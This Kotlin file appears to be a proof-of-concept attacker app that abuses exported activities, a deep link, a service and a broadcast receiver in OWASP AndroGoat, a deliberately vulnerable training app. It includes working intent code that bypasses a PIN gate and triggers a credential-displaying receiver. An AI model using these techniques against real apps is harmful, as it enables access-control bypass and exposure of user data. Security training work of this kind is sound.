package com.example.androgoatpoc.ui.uac

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.TextView
import android.widget.Toast
import androidx.core.content.ContextCompat
import androidx.fragment.app.Fragment
import androidx.lifecycle.ViewModelProvider
import com.example.androgoatpoc.databinding.FragmentUacBinding

private const val TARGET_PKG = "owasp.sat.agoat"

class UnprotectedAndroidComponentsFragment : Fragment() {

    private var _binding: FragmentUacBinding? = null

    // This property is only valid between onCreateView and onDestroyView.
    private val binding get() = _binding!!

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        val vm = ViewModelProvider(this).get(UnprotectedAndroidComponentsViewModel::class.java)
        _binding = FragmentUacBinding.inflate(inflater, container, false)

        val textView: TextView = binding.textHome
        vm.text.observe(viewLifecycleOwner) { textView.text = it }

        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        // 1) Reach an access-controlled screen directly by naming the exported Activity.
        //    AccessControl1ViewActivity is meant to sit behind AndroGoat's PIN gate; because it
        //    is exported, any app can jump straight to it. It does NOT log us in or hand us
        //    credentials -- it just opens the screen that should have been gated.
        binding.buttonLaunchActivity.setOnClickListener {
            val intent = Intent(Intent.ACTION_VIEW).apply {
                setClassName(TARGET_PKG, "$TARGET_PKG.AccessControl1ViewActivity")
            }
            Toast.makeText(requireContext(),
                "Opening exported AccessControl1ViewActivity", Toast.LENGTH_LONG).show()
            startActivity(intent)
        }

        // 2) Same screen, reached through the app's registered deep link (androgoat://vulnapp).
        binding.buttonCustomUrl.setOnClickListener {
            val intent = Intent(Intent.ACTION_VIEW).apply {
                setPackage(TARGET_PKG)
                data = Uri.parse("androgoat://vulnapp")
            }
            Toast.makeText(requireContext(),
                "Opening deep link androgoat://vulnapp", Toast.LENGTH_LONG).show()
            startActivity(intent)
        }

        // 3) Start the exported DownloadInvoiceService.
        //    Two modern-Android gotchas make this non-trivial from a 3rd-party app:
        //    (a) it is a *started* service (onBind() returns null), so bindService() never works;
        //    (b) startService() on a service in another (not-yet-running) app is treated as a
        //        background start and throws BackgroundServiceStartNotAllowedException on O+,
        //        even when we are in the foreground -- so we must use startForegroundService().
        //    The service enqueues its DownloadManager job in onStartCommand() and stops itself.
        binding.buttonDownloadInvoice.setOnClickListener {
            val intent = Intent().apply {
                setClassName(TARGET_PKG, "$TARGET_PKG.DownloadInvoiceService")
            }
            try {
                ContextCompat.startForegroundService(requireContext(), intent)
                Toast.makeText(requireContext(),
                    "Started exported DownloadInvoiceService", Toast.LENGTH_LONG).show()
            } catch (e: Exception) {
                Toast.makeText(requireContext(),
                    "Service start blocked: ${e.javaClass.simpleName}", Toast.LENGTH_LONG).show()
            }
        }

        // 4) Trigger the exported broadcast receiver.
        //    CAVEAT: ShowDataReceiver only shows the credentials in a Toast on the victim app's
        //    UI -- it does not return them to us. This proves the receiver is callable by any
        //    app; it is not a real credential exfiltration.
        binding.buttonReceiver.setOnClickListener {
            val intent = Intent().apply {
                setClassName(TARGET_PKG, "$TARGET_PKG.ShowDataReceiver")
            }
            Toast.makeText(requireContext(),
                "Triggering exported ShowDataReceiver (creds shown in a Toast, not captured)",
                Toast.LENGTH_LONG).show()
            requireContext().sendBroadcast(intent)
        }
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }
}
